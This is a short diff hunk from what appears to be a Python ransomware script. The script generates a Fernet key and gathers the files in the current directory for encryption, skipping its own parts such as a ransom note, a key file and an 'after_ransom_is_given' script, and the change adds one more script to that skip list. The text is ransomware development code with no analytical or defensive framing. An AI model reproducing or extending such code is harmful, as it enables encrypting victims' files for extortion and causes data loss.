@@ -10,7 +10,7 @@ key = Fernet.generate_key()
 
 
 for file in os.listdir():
-    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh" or file == "run_this.sh" or file == "scaredstraight.py":
+    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh" or file == "run_this.sh" or file == "scaredstraight.py" or file == "scared.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
